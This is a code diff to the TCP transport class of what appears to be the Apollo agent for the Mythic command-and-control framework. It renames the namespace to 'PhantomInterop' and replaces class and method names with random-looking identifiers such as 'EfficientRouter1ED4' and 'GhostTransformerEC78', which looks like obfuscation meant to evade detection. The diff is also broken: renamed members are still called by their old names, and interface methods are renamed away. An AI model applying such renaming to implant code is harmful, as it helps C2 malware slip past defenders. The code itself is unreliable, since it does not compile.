@@ -2,28 +2,28 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Classes;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Types.Delegates;
-using ApolloInterop.Structs.ApolloStructs;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Classes;
+using PhantomInterop.Structs.MythicStructs;
+using PhantomInterop.Types.Delegates;
+using PhantomInterop.Structs.PhantomStructs;
 using System.Collections.Concurrent;
-using ApolloInterop.Enums.ApolloEnums;
+using PhantomInterop.Enums.PhantomEnums;
 using System.Threading;
 using ST = System.Threading.Tasks;
-using ApolloInterop.Serializers;
-using ApolloInterop.Constants;
+using PhantomInterop.Serializers;
+using PhantomInterop.Constants;
 using System.Net.Sockets;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Utils;
+using PhantomInterop.Classes.Core;
+using PhantomInterop.Classes.Events;
+using PhantomInterop.Utils;
 
 namespace TcpTransport
 {
-    public class TcpProfile : C2Profile, IC2Profile
+    public class EfficientRouter1ED4 : C2Profile, IC2Profile
     {
 
-        internal struct AsyncTcpState
+        internal struct NexusExecutor4052
         {
             internal TcpClient Client;
             internal CancellationTokenSource Cancellation;
@@ -98,7 +98,7 @@ namespace TcpTransport
             };
         }
 
-        public void OnAsyncConnect(object sender, TcpMessageEventArgs args)
+        public void SpectreResolver027D(object sender, TcpMessageEventArgs args)
         {
             if (_writerTasks.Count > 0)
             {
@@ -117,7 +117,7 @@ namespace TcpTransport
             Connected = true;
         }
 
-        public void OnAsyncDisconnect(object sender, TcpMessageEventArgs args)
+        public void EnhancedMonitorA117(object sender, TcpMessageEventArgs args)
         {
             args.Client.Client?.Close();
             if (_writerTasks.ContainsKey(args.Client))
@@ -134,7 +134,7 @@ namespace TcpTransport
             }
         }
 
-        public void OnAsyncMessageReceived(object sender, TcpMessageEventArgs args)
+        public void EfficientManager76A1(object sender, TcpMessageEventArgs args)
         {
             Byte[] sData = args.Data.Data.Take(args.Data.DataLength).ToArray();
             DebugHelp.DebugWriteLine($"got message from remote connection with length: {sData.Length}");
@@ -220,7 +220,7 @@ namespace TcpTransport
             }
         }
 
-        private void UnwrapMessage()
+        private void EfficientManager9804()
         {
             IPCChunkedData chunkedData = new(id: _currentMessageID, 
                 chunkNum: (int)_currentMessageChunkNum, totalChunks: (int)_currentMessageTotalChunks, 
@@ -242,14 +242,14 @@ namespace TcpTransport
             }
         }
 
-        private void OnAsyncMessageSent(IAsyncResult result)
+        private void SpectreBridge8C10(IAsyncResult result)
         {
             TcpClient client = ((AsyncTcpState)result.AsyncState).Client;
            // TcpClient client = (TcpClient)result.AsyncState;
             client.GetStream().EndWrite(result);
         }
 
-        private bool AddToSenderQueue(IMythicMessage msg)
+        private bool EfficientService0A97(IMythicMessage msg)
         {
             string serializedData = Serializer.Serialize(msg);
             _senderQueue.Enqueue(Encoding.UTF8.GetBytes(serializedData));
@@ -257,7 +257,7 @@ namespace TcpTransport
             return true;
         }
 
-        public void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
+        public void RobustHandlerCD57(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
         {
             MessageType mt = args.Chunks[0].Message;
             List<byte> data = new List<byte>();
@@ -273,7 +273,7 @@ namespace TcpTransport
         }
 
 
-        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
+        public bool StrategicCoordinator5CE5(MessageType mt, OnResponse<IMythicMessage> onResp)
         {
             while (Agent.IsAlive())
             {
@@ -291,7 +291,7 @@ namespace TcpTransport
         }
 
 
-        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
+        public bool GhostTransformerEC78(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
         {
             if (_server == null)
             {
@@ -344,7 +344,7 @@ namespace TcpTransport
             }
         }
 
-        public void Start()
+        public void PhantomProviderF81C()
         {
             _agentConsumerTask = new ST.Task(() =>
             {
@@ -382,7 +382,7 @@ namespace TcpTransport
 
         public bool Send<IMythicMessage>(IMythicMessage message)
         {
-            return AddToSenderQueue((ApolloInterop.Interfaces.IMythicMessage)message);
+            return AddToSenderQueue((PhantomInterop.Interfaces.IMythicMessage)message);
         }
 
         public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
@@ -390,12 +390,12 @@ namespace TcpTransport
             throw new NotImplementedException();
         }
 
-        public bool IsOneWay()
+        public bool WraithRouter6999()
         {
             return true;
         }
 
-        public bool IsConnected()
+        public bool EnhancedMonitor17C1()
         {
             return _writerTasks.Keys.Count > 0;
         }
